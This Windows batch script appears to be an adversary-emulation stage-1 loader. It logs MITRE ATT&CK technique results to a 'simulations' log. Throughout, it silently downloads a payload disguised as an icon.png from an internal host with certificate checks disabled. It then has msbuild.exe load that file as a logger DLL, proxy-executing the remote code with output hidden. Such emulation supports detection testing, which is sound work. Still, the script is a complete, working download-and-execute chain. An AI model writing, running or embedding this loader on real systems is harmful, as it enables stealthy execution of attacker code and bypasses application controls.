@echo off
SETLOCAL EnableDelayedExpansion

REM ----------------------------------------------------------------------
REM Placeholder constant declarations (random-named SET vars)
REM ----------------------------------------------------------------------
SET a1=%APPDATA%\11026\fb422df4
SET a2=a3eab674.txt
SET a3=https://10.0.0.49/stage/2/icon.png?11026-7
SET a4=ITZEL-S2BO
SET a5=11026
SET a6=7
SET a7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM ----------------------------------------------------------------------
REM Core Functionality – Heartbeat fetch
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_start>> "!a7!" 2>nul
curl -k -s -o "!a1!\!a2!" "!a3!"
IF ERRORLEVEL 1 (
    set heart_result=FAIL
    set heart_error=curl_exit_!ERRORLEVEL!
) ELSE (
    set heart_result=OK
    set heart_error=
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_complete>> "!a7!" 2>nul

REM ----------------------------------------------------------------------
REM Change working directory
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!a4!][!a5!]: chdir_start>> "!a7!" 2>nul
cd /d "!a1!"
IF ERRORLEVEL 1 (
    set chdir_result=1
    set chdir_error=cd_failed
) ELSE (
    set chdir_result=0
    set chdir_error=
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: chdir_result=!chdir_result!>> "!a7!" 2>nul

REM ----------------------------------------------------------------------
REM Create minimal .proj file for msbuild
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!a4!][!a5!]: proj_create>> "!a7!" 2>nul
echo ^<Project/^> > "!a1!\build.proj"
IF ERRORLEVEL 1 (
    set proj_result=FAIL
) ELSE (
    set proj_result=OK
)

REM ----------------------------------------------------------------------
REM Invoke Stage 2 Loader DLL via msbuild /logger:
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!a4!][!a5!]: msbuild_start>> "!a7!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!a1!\build.proj" /logger:"!a1!\!a2!;MyParameters,Foo" >NUL 2>&1
IF ERRORLEVEL 1 (
    set msbuild_result=FAIL
    set msbuild_error=msbuild_exit_!ERRORLEVEL!
) ELSE (
    set msbuild_result=OK
    set msbuild_error=
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: msbuild_result>> "!a7!" 2>nul

REM ----------------------------------------------------------------------
REM TTP Logging (one line per TTP at completion)
REM ----------------------------------------------------------------------
IF "!heart_result!!proj_result!!msbuild_result!"=="OKOKOK" (
    set overall=OK
    set overall_error=
) ELSE (
    set overall=FAIL
    set overall_error=heart=!heart_result!;proj=!proj_result!;msbuild=!msbuild_result!
)

echo [!tsvar!][TTP][!a4!][!a5!]: T1218^|System Binary Proxy Execution=!overall!:!overall_error!>> "!a7!" 2>nul
echo [!tsvar!][TTP][!a4!][!a5!]: T1027^|Obfuscated Files or Information=!overall!:!overall_error!>> "!a7!" 2>nul

ENDLOCAL
exit /b 0